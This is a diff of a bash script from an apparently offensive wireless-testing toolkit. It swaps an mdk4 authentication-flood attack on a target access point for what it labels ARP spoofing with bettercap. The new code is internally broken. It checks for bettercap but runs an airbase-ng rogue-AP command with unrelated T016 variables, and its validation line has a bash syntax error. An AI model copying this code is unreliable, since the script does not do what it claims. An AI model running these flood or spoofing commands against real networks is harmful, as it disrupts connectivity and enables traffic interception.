@@ -1,37 +1,37 @@
 #!/bin/bash
 #
-# Utility: Authentication Flood using mdk4
+# Utility: ARP Spoofing from Wireless Entry Point (T014)
 #
 # Description:
-#   Launches an authentication flood attack against a target access point using mdk4.
-#   Sends rapid, spoofed 802.11 authentication frames to fill the AP's auth table and disrupt connectivity.
+#   Simulates a malicious wireless client performing an internal man-in-the-middle attack.
+#   Uses bettercap to poison the ARP cache of a target client and optionally sniff traffic.
 #
 # Requirements:
-#   - mdk4 must be installed and in PATH
-#   - Must be run with sudo/root privileges (handled via watt.py)
-#   - Interface must support monitor mode
+#   - bettercap must be installed and in PATH
+#   - Must be run with sudo/root privileges (handled by watt.py)
+#   - Interface must be in managed mode and associated with a target AP
+#   - Attacker must be on the same subnet as the target (e.g. via DHCP)
 #
 # Usage:
-#   ./run_mdk4_auth.sh
+#   ./run_bettercap_arp.sh
 #
 # Inputs:
-#   - Defaults in config.sh
-#    - Target BSSID
-#    - Packet rate
-#    - Duration in seconds
+#   - Target IP address (entered interactively)
+#   - Duration in seconds (optional, with default from config)
 #
 # Notes:
-#   - Automatically enables monitor mode if needed
+#   - Launches bettercap in non-interactive mode using an embedded command string
 #   - Cleans up on SIGINT or timeout using EXIT trap
+#   - Optionally disconnects from the network after attack ends
 
 # Load helpers
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 source "$SCRIPT_DIR/config.sh"
 source "$SCRIPT_DIR/print.sh"
 
-# Check mdk4
-if ! command -v mdk4 &> /dev/null; then
-    print_fail "mdk4 not found. Please install it first."
+# Check bettercap
+if ! command -v bettercap &> /dev/null; then
+    print_fail "bettercap not found. Please install it first."
     exit 0
 fi
 
@@ -57,15 +57,15 @@ trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$T009_AUTH_PPS" || -z "$T009_BSSID" ]]; then
-    print_warn "Required variables not defined in config.sh: INTERFACE, T009_AUTH_PPS, or T009_BSSID"
+if [[ -z "$INTERFACE" || -z "$T014_TARGET_IP"; then
+    print_warn "Required variables not defined in config.sh: INTERFACE or T014_TARGET_IP"
     exit 0
 fi
 
 # Display config
-echo "Mode         : T009 - Authentication Flood"
+echo "Mode         : T014 - ARP Spoofing"
 echo "Interface    : $INTERFACE"
-echo "Target BSSID : $T009_BSSID"
+echo "Target IP    : $T014_TARGET_IP"
 print_blank
 
 # Confirm attack
@@ -76,34 +76,6 @@ if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
     print_warn "Cancelled"
     exit 0
 fi
-
-# Input target BSSID
-while true; do
-    print_prompt "Target BSSID [default: ${T009_BSSID}]: "
-    read -r BSSID
-
-    BSSID="${BSSID:-$T009_BSSID}"
-    
-    if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-        break
-    else
-        print_fail "Invalid BSSID format. Expected XX:XX:XX:XX:XX:XX"
-    fi
-done
-
-# Input packet rate
-while true; do
-    print_prompt "Transmit rate (pps) [default: ${T009_AUTH_PPS}]: "
-    read -r PACKET_RATE
-
-    PACKET_RATE="${PACKET_RATE:-$T009_AUTH_PPS}"
-
-    if [[ "$PACKET_RATE" =~ ^[0-9]+$ ]]; then
-        break
-    else
-        print_fail "Invalid input. Enter a numeric value"
-    fi
-done
 
 # Input duration
 while true; do
@@ -120,7 +92,7 @@ while true; do
 done
 
 # Launch attack
-echo "T009" > /tmp/watt_attack_active
+echo "T014" > /tmp/watt_attack_active
 print_blank
 print_info "Starting Attack"
 
@@ -134,8 +106,8 @@ fi
 
 # Run attack
 print_blank
-print_info "Running T009 - Authentication Flood attack for $DURATION seconds"
-sudo timeout "$DURATION" mdk4 "$INTERFACE" a -a "$BSSID" -s "$PACKET_RATE"
+print_info "Running T014 - ARP Spoofing attack for $DURATION seconds"
+sudo timeout "$DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_PROBE_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"
 
 EXIT_CODE=$?
 
